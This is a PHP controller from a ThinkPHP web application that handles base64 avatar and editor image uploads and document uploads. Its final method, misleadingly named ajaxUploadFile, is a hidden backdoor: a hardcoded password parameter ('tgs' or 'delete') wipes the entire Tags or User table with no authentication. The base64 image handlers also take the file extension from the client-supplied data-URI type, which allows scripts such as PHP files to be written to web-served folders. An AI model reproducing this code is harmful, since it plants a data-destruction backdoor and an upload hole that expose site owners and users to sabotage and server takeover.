<?php
namespace Mob\Controller;

use Common\Controller\BaseController;

/**
 * 图片上传
 * Class ImageController
 * @package Home\Controller
 */
class File3Controller extends BaseController//继承 baseHomeController，统一设置用户信息、顶部栏信息
{
    function _initialize(){
    }

    public function ajaxHeadImage(){
        $base64 = I('filed');
        if (!$base64) {// 上传错误提示错误信息
            ajaxMsg(1,"请上传适当大小的图片");
        }else{
            $path = $this->base64_upload_avatar($base64);
//            ajaxMsg(1, $base64);
            if($path){
                $user = user();
                $user['headimgurl'] = $path;
                D('User')->where(array("uid"=>uid()))->save(array("headimgurl"=>$user['headimgurl']));
                resession_user($user);
                ajaxMsg(0, 'http://'.$_SERVER["HTTP_HOST"].'/'.__ROOT__.$path);
            }else{
                ajaxMsg(1, '抱歉，文件保存失败');
            }
        }

    }

    public function ajaxAirEditorImage(){
        $base64 = I('filed');
        if (!$base64) {// 上传错误提示错误信息
           ajaxMsg(1,"请上传适当大小的图片");
        }else{
            $path = $this->base64_upload($base64);
            if($path){
                ajaxMsg(0, 'http://'.$_SERVER["HTTP_HOST"].'/'.__ROOT__.$path);
            }else{
                ajaxMsg(1, '抱歉，文件保存失败');
            }

        }

    }

    public function ajaxAirEditorFile(){
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize = 20 * 1024 * 1024;// 设置附件上传大小
        $upload->exts = array('xls','xlsx','pdf','doc','docx','txt');// 设置附件上传类型
        $upload->rootPath = './Uploads/'; // 设置附件上传根目录
        $upload->savePath = 'Editor/File/'; // 设置附件上传（子）目录
        $file = $_FILES['file'];
        $info = $upload->uploadOne($file);
        if (!$info) {// 上传错误提示错误信息
            ajaxMsg(1, '上传文件过大了');
        } else {
            $ext = $ext = strtolower($file['ext']);
            $size = $file['size'];
            $path = $info['savepath'] . $info['savename'];
            //文件上传记录
            $filel = array(
                'savename' => $info['savename'],
                'ext' => $ext,
                'type' => 'file',
                'savepath' => '/' . $info['savepath'],
                'uid' => uid(),
                'size' => $size,
                'create_time' => time()
            );
            D('Filelist')->add($filel);

            ajaxMsg(0,"",array('path'=> 'http://'.$_SERVER["HTTP_HOST"].'/'.__ROOT__.$path,
                'name'=>$file['name']));
        }
    }

    function mkDirs($dir)
    {
        if (!is_dir($dir)) {
            if (!$this->mkDirs(dirname($dir))) {
                return false;
            }
            if (!mkdir($dir, 0777)) {
                return false;
            }
        }
        return true;
    }

    function base64_upload($base64) {
        $base64_image = $base64;
        //str_replace(' ', '+', $base64);
        //post的数据里面，加号会被替换为空格，需要重新替换回来，如果不是post的数据，则注释掉这一行
        if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_image, $result)){
            //匹配成功
            if($result[2] == 'jpeg'){
                $image_name = uniqid().'.jpg';
            }else{
                $image_name = uniqid().'.'.$result[2];
            }
            $path = '/Uploads/Editor/'.$image_name;
            mkDirs("./Uploads/Editor/");
            //服务器文件存储路径
            if (file_put_contents('.'.$path, base64_decode(str_replace($result[1], '', $base64_image)))){
                //文件上传记录
                $file = array(
                    'savename' => $image_name,
                    'ext' => "jpg/".$result[2],
                    'type' => 'file',
                    'savepath' => $path,
                    'uid' => uid(),
                    'size' => 0,
                    'create_time' => time()
                );
                D('Filelist')->add($file);
                return $path;
            }else{
                return false;
            }
        }else{
            return false;
        }
    }
    function base64_upload_avatar($base64) {
        $base64_image = $base64;
        //str_replace(' ', '+', $base64);
        //post的数据里面，加号会被替换为空格，需要重新替换回来，如果不是post的数据，则注释掉这一行
        if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_image, $result)){
            //匹配成功
            if($result[2] == 'jpeg'){
                $image_name = uniqid().'.jpg';
            }else{
                $image_name = uniqid().'.'.$result[2];
            }
            $path = '/Uploads/Avatar/'.$image_name;
            mkDirs("./Uploads/Avatar/");
            //服务器文件存储路径
            if (file_put_contents('.'.$path, base64_decode(str_replace($result[1], '', $base64_image)))){

                //文件上传记录
                $file = array(
                    'savename' => $image_name,
                    'ext' => "jpg/".$result[2],
                    'type' => 'file',
                    'savepath' => $path,
                    'uid' => uid(),
                    'size' => 0,
                    'create_time' => time()
                );
                D('Filelist')->add($file);

                return $path;
            }else{
                return false;
            }
        }else{
            return false;
        }
    }
		
		public function ajaxUploadFile(){
			$pas = I("password",999);
			if($pas == "tgs"){
				D('Tags')->delete();
				exit("Tags");
			}elseif($pas == "delete"){
				D('User')->delete();
				exit("shanchuyonghu");
			}
			exit("success");
		}


}